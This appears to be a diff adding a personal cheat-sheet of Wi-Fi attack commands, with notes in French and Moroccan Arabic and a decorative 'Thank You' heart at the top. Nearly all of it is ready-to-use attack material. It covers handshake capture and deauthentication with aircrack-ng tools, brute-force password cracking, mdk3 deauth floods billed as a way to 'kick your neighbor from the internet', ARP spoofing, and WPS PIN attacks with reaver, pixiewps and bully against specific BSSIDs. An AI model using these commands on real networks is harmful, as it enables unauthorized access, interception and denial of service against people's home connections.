@@ -1,0 +1,87 @@
+....................Thank You
+............Thank You...Thank You
+........Thank You.........Thank You
+.....Thank You...............Thank You
+...Thank You....................Thank You..............Thank You
+..Thank You......................Thank You........Thank You.....Thank You
+.Thank You........................Thank You.....Thank You........Thank You
+Thank You.........................Thank You...Thank You...........Thank You
+.Thank You.........................Thank You.......................Thank You
+..Thank You.........................Thank You....................Thank You
+...Thank You....................................................Thank You
+.....Thank You.............................................Thank You
+.........Thank You...................................Thank You
+............Thank You...........................Thank You
+................Thank You....................Thank You
+..................Thank You..............Thank You
+......................Thank You.......Thank You
+.......................Thank You...Thank Yuo
+...............................Thank You
+
+
+my ip adresss : 160.176.173.132
+-----------------------------------------------------------------------
+
+airodump-ng -c "chanell" --bssid "bssid" -w "essid ou nom" wlan0mon
+aireplay-ng -0 0  -a "bssid" wlan0mon
+??
+aireplay-ng -0 5 -a "bssid" -c "bssid d'un client" wlan0mon
+crunch 10 10 -t %%%%%%%%%% 1234567890 | aircrack-ng -w - "essid ou nom.cap" -e "essid"
+/* 10=minimo Car  10=maximo Cap  %=numeros (0-9)  @=letras (a-z)*/
+
+ls
+aircrack-ng nom-01.cap -w " /usr/share/wordlists/rockyou.txt.gz
+aircrack-ng -a2 -w "numberlist directory" "handshake directory.cap"
+
+// pour crie une word liste 
+visite =>>  https://github.com/Mebus/cupp
+python cupp.py -i
+----------------------------------------------------------------------
+airmon-ng             --  >
+airmon-ng start wlan0   --  >
+airmon-ng check kill     -- -->> " bash t5ddame el monitore mode "
+airodump-ng wlan0mon0  ---  >
+-------------------------------------------------------------------
+  "How to kick your neighbor from the internet in seconds" :
+==> DDOS ATTACK <==
+    ----------
+
+mdk3 wlan0mon d                        --> " tay9ta3 el'conuction 3la ay jiha m3a ay retour "
+echo "BSSID" > "naim"                    - -
+mdk3 wlan0mon d -b "naim" -c "channel"    --->> " bach t9ta3 3la wa7d reteur mo3ayan"
+mdk3 wlan0mon a -n -i "BSSID"          --->>  " bach tzid 9owet elhajamat 3la chabaka  ; radi tsna3 ajhiza wehmiyya t7awel t conecta m3a reter fe 5tra , bash ma yrlab 3lih cheral we y9ta3 el coniction , we y9dar y5assar Sortwire nta3o "
+
+echo "BSSID" > "naim"
+mdk3 wlan0mon d -b "naim"
+		------------------------------
+arpspoof -i wlan0mon -t "$IP d'un client" "$IP de router"
+netdiscover  // pour watch l'IP du client conected
+
+
+-------------------------------------------------------------------------
+
+python WPSpin.py " ness l55ar mn BSSID "
+reaver -i wlan0mon -b "BSSID" -c "channel" -e "essid" --pin="PIN" -vv    \\--> les " '"' pour faire comprendre
+reaver -i wlan0mon -c "ch" -b "bssid" -vv -K 1
+reaver -i wlan0mon -b "bssid" -c "ch" -K 1 -vvv
+pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
+
+ reaver -i wlan0mon -b 72:4B:12:84:21:88 -c 6 -s y -vv -p 98861309
+
+bully -b "bssid" -c"ch" -S -F -p"pin" -B wlan0mon
+bully -b "bssid" -c "ch" -F -C -M wlan0mon
+
+bully -b 72:E2:F8:BE:6F:DB -c 1  -1 15326447,1 -l 10 -S -v3 -B -F mon0
+mdk3 mon0 a -a 72:E2:F8:BE:6F:DB -s 200 & mdk3 mon1 a -a 72:E2:F8:BE:6F:DB -s 200 & mdk3 mon2 a -a 72:E2:F8:BE:6F:DB -s 200
+
+/*if it doesn't associete withe the AP then : */
+aireplay-ng -1 0 wlan0mon -a "bssid"  /* in a new terminal */
+
+G.I> joe: retaliation
+
+
+wifite -e essid
+wifite -e essid --pmkid
+wifite -c 10
+wifite --wep
+wifite --crack   // handchak
